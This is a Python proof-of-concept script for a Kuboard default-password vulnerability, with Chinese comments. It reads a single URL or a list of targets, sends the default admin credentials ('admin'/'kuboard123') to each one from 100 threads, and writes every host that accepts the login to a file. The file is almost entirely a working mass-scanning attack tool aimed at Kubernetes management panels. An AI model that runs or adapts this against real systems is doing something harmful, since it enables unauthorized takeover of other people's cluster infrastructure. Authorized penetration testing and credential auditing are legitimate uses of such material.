import requests
import argparse
import sys
import logging
from multiprocessing.dummy import Pool

# 禁用 urllib3 警告
requests.packages.urllib3.disable_warnings()

# 设置日志配置
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
GREEN = '\033[92m'  # 输出颜色
RESET = '\033[0m'

def banner():
    test = r"""

  _              _             
 (_)            (_)            
  ___      _____ _ _ __   __ _ 
 | \ \ /\ / / _ \ | '_ \ / _` |
 | |\ V  V /  __/ | | | | (_| |
 |_| \_/\_/ \___|_|_| |_|\__,_|


                            version:1.1.0
                            author:fangwei
"""
    logging.info(test)

def main():
    banner()

    parser = argparse.ArgumentParser(description='Kuboard 默认口令漏洞')
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please input link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='File Path')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, "r", encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip())
        # 多线程处理
        with Pool(100) as mp:
            mp.map(poc, url_list)
    else:
        logging.error("Usage:\n\t python3 {} -h".format(sys.argv[0]))


def poc(target):
    credentials = {
        "username": "admin",
        "password": "kuboard123"
    }
    proxies = {
        "http": "http://127.0.0.1:8080",
        "https": "http://127.0.0.1:8080",
    }

    try:
        # 发送POST请求以尝试登录
        response = requests.post(url=target, json=credentials, verify=False, timeout=5, proxies=proxies)

        # 检查响应状态码
        if response.status_code == 200:
            logging.info(f"{GREEN}[+] 登录成功！{target}，请访问 {response.json()}{RESET}")
            with open('kubore.txt', 'a', encoding='utf-8') as fp:
                fp.write(target + '\n')
        else:
            logging.info(f"[-] 登录失败: {target}")

    except Exception as e:
        logging.error(f"[*] 无法访问 {target}, 错误信息: {e}")

if __name__ == '__main__':
    main()
